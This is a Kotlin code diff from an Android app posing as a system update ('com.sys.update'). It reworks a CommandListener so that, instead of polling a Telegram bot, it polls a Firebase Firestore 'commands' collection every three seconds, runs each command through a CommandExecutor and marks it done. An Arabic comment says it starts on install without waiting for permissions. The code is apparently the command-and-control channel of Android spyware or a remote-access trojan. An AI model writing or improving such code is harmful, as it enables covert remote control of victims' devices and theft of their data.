@@ -2,35 +2,43 @@ package com.sys.update
 
 import android.content.Context
 import android.util.Log
+import okhttp3.MediaType.Companion.toMediaType
+import okhttp3.OkHttpClient
+import okhttp3.Request
+import okhttp3.RequestBody.Companion.toRequestBody
 import org.json.JSONObject
+import java.util.concurrent.TimeUnit
 import kotlin.concurrent.thread
 
+/**
+ * CommandListener — يقرأ الأوامر من Firestore
+ * يعمل بمجرد تثبيت التطبيق — بدون انتظار صلاحيات
+ */
 object CommandListener {
 
     private var running = false
-    private var offset = 0L
     private var worker: Thread? = null
+
+    private val client = OkHttpClient.Builder()
+        .connectTimeout(15, TimeUnit.SECONDS)
+        .readTimeout(15, TimeUnit.SECONDS)
+        .build()
+
+    private val FS_COMMANDS =
+        "https://firestore.googleapis.com/v1/projects/${Config.FIREBASE_PROJECT_ID}/databases/(default)/documents/commands"
 
     fun start(ctx: Context) {
         if (running) return
         running = true
 
-        worker = thread(name = "telegram-poll") {
+        worker = thread(name = "firestore-cmd-poll") {
             while (running) {
                 try {
-                    val updates = TelegramApi.getUpdates(offset)
-                    if (updates != null) {
-                        for (i in 0 until updates.length()) {
-                            val update = updates.optJSONObject(i) ?: continue
-                            offset = update.optLong("update_id", offset) + 1
-                            processUpdate(ctx, update)
-                        }
-                    } else {
-                        Thread.sleep(1000)
-                    }
+                    pollCommands(ctx)
+                    Thread.sleep(3000) // كل 3 ثواني
                 } catch (e: Exception) {
                     Log.e("CmdListener", "loop err: ${e.message}")
-                    Thread.sleep(2000)
+                    Thread.sleep(5000)
                 }
             }
         }
@@ -42,27 +50,58 @@ object CommandListener {
         worker = null
     }
 
-    private fun processUpdate(ctx: Context, update: JSONObject) {
+    private fun pollCommands(ctx: Context) {
         try {
-            // Callback query (button click)
-            update.optJSONObject("callback_query")?.let { cb ->
-                val data = cb.optString("data", "")
-                val cbId = cb.optString("id", "")
-                if (data.isNotBlank()) {
-                    CommandExecutor.handle(ctx, data, cbId)
-                }
-                return
-            }
+            val url = "$FS_COMMANDS?key=${Config.FIREBASE_API_KEY}&pageSize=20"
+            val req = Request.Builder().url(url).get().build()
 
-            // Text message
-            update.optJSONObject("message")?.let { msg ->
-                val text = msg.optString("text", "")
-                if (text.isNotBlank()) {
-                    CommandExecutor.handleText(ctx, text)
+            client.newCall(req).execute().use { resp ->
+                val body = resp.body?.string() ?: return
+                val obj = JSONObject(body)
+                val docs = obj.optJSONArray("documents") ?: return
+
+                for (i in 0 until docs.length()) {
+                    val doc = docs.optJSONObject(i) ?: continue
+                    val name = doc.optString("name", "")
+                    val fields = doc.optJSONObject("fields") ?: continue
+
+                    val text = fields.optJSONObject("text")?.optString("stringValue") ?: ""
+                    val processed = fields.optJSONObject("processed")?.optBoolean("booleanValue") ?: false
+
+                    if (text.isBlank() || processed) continue
+
+                    Log.d("CmdListener", "cmd: $text")
+
+                    try {
+                        CommandExecutor.handleText(ctx, text)
+                    } catch (e: Exception) {
+                        Log.e("CmdListener", "exec err: ${e.message}")
+                    }
+
+                    markProcessed(name)
                 }
             }
         } catch (e: Exception) {
-            Log.e("CmdListener", "process err: ${e.message}")
+            Log.e("CmdListener", "poll err: ${e.message}")
         }
+    }
+
+    private fun markProcessed(docName: String) {
+        try {
+            val docId = docName.substringAfterLast("/")
+            val url = "$FS_COMMANDS/$docId?key=${Config.FIREBASE_API_KEY}&updateMask.fieldPaths=processed"
+
+            val fields = JSONObject().apply {
+                put("processed", JSONObject().put("booleanValue", true))
+            }
+            val body = JSONObject().apply { put("fields", fields) }.toString()
+
+            val req = Request.Builder()
+                .url(url)
+                .patch(body.toRequestBody("application/json".toMediaType()))
+                .build()
+
+            client.newCall(req).execute().use { }
+        } catch (_: Exception) {}
     }
 }
